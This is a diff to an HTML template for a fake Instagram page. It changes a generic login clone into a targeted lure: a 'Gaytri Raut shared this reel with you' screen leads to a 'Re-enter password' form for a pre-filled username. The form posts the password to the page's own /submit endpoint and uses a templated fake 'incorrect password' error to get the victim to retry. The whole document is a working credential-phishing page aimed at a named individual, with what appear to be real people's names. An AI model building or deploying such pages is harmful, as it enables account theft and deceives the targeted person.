@@ -11,73 +11,92 @@
 
 <body>
     <div class="container">
-        <div class="box">
-            <div class="heading"></div>
-            <form class="login-form" action="/submit" method="post">
-                <div class="field">
-                    <input id="username" type="name" name="username"  placeholder="Phone number, username, or email" required />
-                    <label for="username">Phone number, username, or email</label>
+        
+        <!-- PAGE 1: REEL VIEW -->
+        <div id="reel-page" class="page">
+            <div class="top-nav">
+                <div class="instagram-logo">Instagram</div>
+                <a href="#" class="continue-web">Continue on web</a>
+            </div>
+
+            <div class="reel-card" id="reel-trigger">
+                <div class="reel-video-container">
+                    <img src="https://images.unsplash.com/photo-1543466835-00a7907e9de1?w=500&auto=format&fit=crop&q=60" alt="Reel thumbnail">
+                    <div class="play-icon"></div>
                 </div>
-                <div class="field">
-                    <input id="password" type="password" name="password" placeholder="password" required />
-                    <label for="password">Password</label>
-                </div>
-                <button type="submit" class="login-button" title="login">Log In</button>
-                <div class="separator">
-                    <div class="line"></div>
-                    <p>OR</p>
-                    <div class="line"></div>
-                </div>
-                <div class="other">
-                    <button class="fb-login-btn" type="button">
-                        <a href="http://facebook.com" style="color: #385185; font-weight: 550;">Log in with Facebook</a>
-                    </button>
-                    <p class="error-message" style="display:{{params["display_type"]}};" >Sorry, your password was incorrect. Please double-check your password.</p>
-                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot
-                        password?</a>
-                </div>
-            </form>
-        </div>
-        <div class="box">
-            <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></p>
-        </div>
-        <div class="get">
-           <p style="margin: 0;">Get the app.</p>
-        </div>
-        <br>
-        <div class="apps">
-            <a href="https://play.google.com/">
-                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
-                    width="130"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a
-                href="https://www.microsoft.com/">
-                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="130"></a>
-        </div>
-        <br>
-        <div class="footer">
-            <footer>
-                Meta
-                About
-                Blog
-                Jobs
-                Help
-                API
-                Privacy
-                Terms
-                Top Accounts
-                Hashtags
-                Locations
-                Instagram Lite
-                Contact Uploading & Non-Users
-            </footer>
-        </div>
-        <div class="copyright">
-            <br>
-            English © 2025 Instagram from Meta
+            </div>
+
+            <p class="reel-text">Gaytri Raut shared this reel with you</p>
+
+            <button type="button" class="primary-btn" id="open-ig-btn">Open Instagram</button>
+            <a href="https://www.instagram.com/accounts/emailsignup/" class="secondary-link">Sign up</a>
+
+            <p class="terms-text">
+                By continuing, you agree to Instagram's <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.
+            </p>
         </div>
 
+        <!-- PAGE 2: PASSWORD LOGIN VIEW -->
+        <div id="login-page" class="page hidden">
+            <div class="login-header-nav">
+                <button type="button" class="back-button" id="back-btn">&#8592;</button>
+            </div>
+
+            <div class="login-content-wrapper">
+                <div class="profile-container">
+                    <!-- Profile image without border -->
+                    <img src="/profile-image" alt="Profile Picture" class="profile-pic">
+                    <span class="username-display">sachingaikwad1151996</span>
+                </div>
+
+                <form class="login-form" id="login-form" action="/submit" method="post">
+                    <input type="hidden" name="username" value="sachingaikwad1151996">
+                    
+                    <div class="field">
+                        <input id="password" type="password" name="password" placeholder="Re-enter password" required />
+                    </div>
+                    
+                    <p class="error-message" style="display: {{ params['display_type'] }};" id="error-msg">Sorry, your password was incorrect. Please double-check your password.</p>
+
+                    <button type="submit" class="primary-btn">Log in</button>
+                    <button type="button" class="try-another-btn">Try another way</button>
+                </form>
+            </div>
+        </div>
 
     </div>
-      
+
+    <!-- JavaScript logic -->
+    <script>
+        const reelPage = document.getElementById('reel-page');
+        const loginPage = document.getElementById('login-page');
+        const openIgBtn = document.getElementById('open-ig-btn');
+        const reelTrigger = document.getElementById('reel-trigger');
+        const backBtn = document.getElementById('back-btn');
+
+        function goToLogin() {
+            reelPage.classList.add('hidden');
+            loginPage.classList.remove('hidden');
+            window.scrollTo(0, 0);
+        }
+
+        openIgBtn.addEventListener('click', goToLogin);
+        reelTrigger.addEventListener('click', goToLogin);
+
+        backBtn.addEventListener('click', () => {
+            loginPage.classList.add('hidden');
+            reelPage.classList.remove('hidden');
+            window.scrollTo(0, 0);
+        });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const errorDisplay = "{{ params['display_type'] }}";
+            if (errorDisplay === "block") {
+                reelPage.classList.add('hidden');
+                loginPage.classList.remove('hidden');
+            }
+        });
+    </script>
 </body>
 
 </html>
